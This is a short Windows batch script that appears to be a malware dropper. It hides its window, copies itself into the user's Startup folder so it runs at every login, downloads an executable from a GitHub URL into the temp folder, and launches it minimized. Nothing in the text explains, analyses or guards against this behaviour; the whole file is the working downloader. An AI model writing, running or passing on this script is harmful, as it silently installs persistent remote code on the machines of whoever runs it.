@echo off
powershell.exe -windowstyle Hidden -command
title %random%
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %temp%
if exist "YourProgram.exe" del YourProgram.exe
powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/YourProgram.exe -OutFile "YourProgram.exe"
start /min YourProgram.exe
exit